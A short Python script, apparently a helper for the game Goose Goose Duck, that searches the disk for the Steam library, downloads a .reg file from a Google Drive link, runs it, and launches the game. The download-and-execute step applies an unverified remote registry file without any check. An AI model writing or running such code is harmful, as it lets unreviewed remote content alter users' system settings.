import urllib.request
import os


def directory_find(atom, root='/'):
    for path, dirs, files in os.walk(root):
        if atom in dirs:
            return os.path.join(path, atom)


steamapps_location = directory_find('steamapps')
game_location = f"{steamapps_location}\\common\\Goose Goose Duck"
file_saved_location = f"{game_location}\\registry_adornment.reg"

urllib.request.urlretrieve(
    "https://drive.usercontent.google.com/download?id=1IGENwFzLm8bBEboISadYSNEdxbnjz1fH&export=download&confirm=t&uuid=90d05a24-7157-49e9-938d-45ee5f6da3a1",
    file_saved_location)

file_saved_location = "\"" + file_saved_location + "\""  # because whitespaces on windows suck
os.system(file_saved_location)

game_executable_location = f"{game_location}\\Goose Goose Duck.exe"
game_executable_location = "\"" + game_executable_location + "\""  # because whitespaces on windows suck
os.system(game_executable_location)
